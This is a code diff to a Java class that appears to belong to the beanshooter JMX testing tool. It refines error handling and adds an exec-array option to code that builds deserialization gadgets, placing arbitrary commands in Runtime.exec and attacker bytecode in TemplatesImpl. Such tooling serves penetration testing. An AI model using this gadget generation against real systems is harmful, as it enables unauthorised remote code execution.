@@ -105,8 +105,7 @@ public class YsoIntegration
             Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during gadget generation.");
             Logger.eprintMixedBlue("You probably specified", "a wrong gadget name", "or an ");
             Logger.eprintlnPlainBlue("invalid gadget argument.");
-            ExceptionHandler.showStackTrace(e);
-            Utils.exit();
+            Utils.exit(e);
         }
 
         Logger.printlnPlain(" done.");
@@ -163,7 +162,7 @@ public class YsoIntegration
         catch (IOException e)
         {
             Logger.printlnMixedYellow("Caught unexpected", "IOException", "while reading " + MBean.TONKA.getJarName() + ".");
-            Utils.exit();
+            Utils.exit(e);
         }
 
         base64 = new String(Base64.getEncoder().encode(content));
@@ -201,12 +200,12 @@ public class YsoIntegration
     private static Object getUploadTemplateGadget(String command)
     {
         String base64 = null;
-        String[] split = command.split(":");
+        String[] split = command.split("::");
 
         if (split.length != 2)
         {
             Logger.eprintlnMixedYellow("Invalid upload parameter:", command);
-            Logger.eprintlnMixedBlue("The expected format is:", "<SRC>:<DST>");
+            Logger.eprintlnMixedBlue("The expected format is:", "<SRC>::<DST>");
             Utils.exit();
         }
 
@@ -237,9 +236,16 @@ public class YsoIntegration
      */
     private static Object getCommandTemplateGadget(String command)
     {
-        String java = "java.lang.Runtime.getRuntime().exec(\"" +
-                command.replace("\\", "\\\\").replace("\"", "\\\"") +
-                "\");";
+        String escCommand = command.replace("\\", "\\\\").replace("\"", "\\\"");
+        String java = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", escCommand);
+
+        if (BeanshooterOption.STANDARD_EXEC_ARRAY.getBool())
+        {
+            String[] cmd = escCommand.split(" ", 3);
+            java = String.format("java.lang.Runtime.getRuntime().exec("
+                    + "new String[] { \"%s\", \"%s\", \"%s\" } );",
+                    cmd[0], cmd[1], cmd[2]);
+        }
 
         return templateGadgetFromJava(java);
     }
@@ -279,8 +285,7 @@ public class YsoIntegration
         catch (NotFoundException | CannotCompileException | IOException e)
         {
             Logger.printlnMixedYellow("Caught", e.getClass().getName(), "during dynamic class generation.");
-            ExceptionHandler.showStackTrace(e);
-            Utils.exit();
+            Utils.exit(e);
         }
 
         return createTemplateGadget(payloadBytes, dummyBytes);
@@ -302,8 +307,8 @@ public class YsoIntegration
     private static Object createTemplateGadget(byte[] payloadBytes, byte[] dummyBytes)
     {
         final TemplatesImpl template = new TemplatesImpl();
-
         Field bytecodeField;
+
         try
         {
             bytecodeField = template.getClass().getDeclaredField("_bytecodes");
@@ -322,8 +327,7 @@ public class YsoIntegration
         catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException | InstantiationException e)
         {
             Logger.printlnMixedYellow("Caught", e.getClass().getName(), "while creating TemplatesIml object.");
-            ExceptionHandler.showStackTrace(e);
-            Utils.exit();
+            Utils.exit(e);
         }
 
         return template;
